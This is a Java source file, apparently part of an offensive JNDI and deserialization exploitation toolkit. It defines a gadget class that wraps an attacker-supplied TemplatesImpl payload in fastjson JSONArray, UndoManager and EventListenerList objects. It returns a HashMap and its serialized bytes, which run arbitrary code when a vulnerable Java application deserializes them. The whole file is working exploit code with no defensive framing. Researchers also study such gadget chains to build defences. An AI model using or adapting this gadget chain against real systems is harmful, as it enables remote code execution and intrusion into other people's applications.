package sonomon.jndi.deser.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.util.HashMap;
import java.util.Vector;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Fastjson_EventListenerList_Templates implements SerializeObject{
	//fastjson3
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		
		
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(tempImpl);

        //存在serialVersionUID问题
        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Deserialize.getFieldValue(undoManager, "edits").get(undoManager);
        vector.add(jsonArray);
        Deserialize.setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});
        
        HashMap hashMap = new HashMap();
        hashMap.put(tempImpl,eventListenerList);
        
        return hashMap;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}